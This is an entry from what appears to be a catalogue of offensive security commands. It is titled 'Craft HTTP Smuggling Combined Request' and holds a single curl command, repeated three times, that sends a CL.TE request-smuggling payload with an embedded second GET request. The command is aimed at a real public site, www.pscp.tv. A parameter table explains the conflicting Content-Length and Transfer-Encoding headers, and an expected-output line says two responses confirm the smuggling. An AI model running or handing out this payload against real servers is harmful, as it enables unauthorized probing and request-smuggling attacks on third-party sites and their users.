---
data: >-
  curl -i -s -k -X POST 'https://www.pscp.tv/' -H 'Content-Length: 35' -H
  'Transfer-Encoding: chunked' --data '0\r\nGET / HTTP/1.1\r\nHost:
  www.pscp.tv\r\n\r\n\r\n'
tags:
  - http-smuggling
type: command
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
id: 54aabad9-04db-44ba-8a5f-b2cfcdf1d873
created_at: '2025-12-13T09:01:21.905Z'
updated_at: '2025-12-13T09:01:21.905Z'
verified: false
validated: true
submitted: true
---
# Craft HTTP Smuggling Combined Request

## Command

```bash
curl -i -s -k -X POST 'https://www.pscp.tv/' -H 'Content-Length: 35' -H 'Transfer-Encoding: chunked' --data '0\r\nGET / HTTP/1.1\r\nHost: www.pscp.tv\r\n\r\n\r\n'
```

## Description

This command combines two requests into one for smuggling exploitation.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-H 'Content-Length: 35'` | Sets specific content length | Yes |
| `--data '0\r\nGET ...'` | Embeds secondary GET request | Yes |

## Examples

### Basic Usage

```bash
curl -i -s -k -X POST 'https://www.pscp.tv/' -H 'Content-Length: 35' -H 'Transfer-Encoding: chunked' --data '0\r\nGET / HTTP/1.1\r\nHost: www.pscp.tv\r\n\r\n\r\n'
```

## Expected Output

Two HTTP responses in one, confirming smuggling.

## Related

- [[procedures/Exploit-HTTP-Request-Smuggling-by-Combining-Requests]]
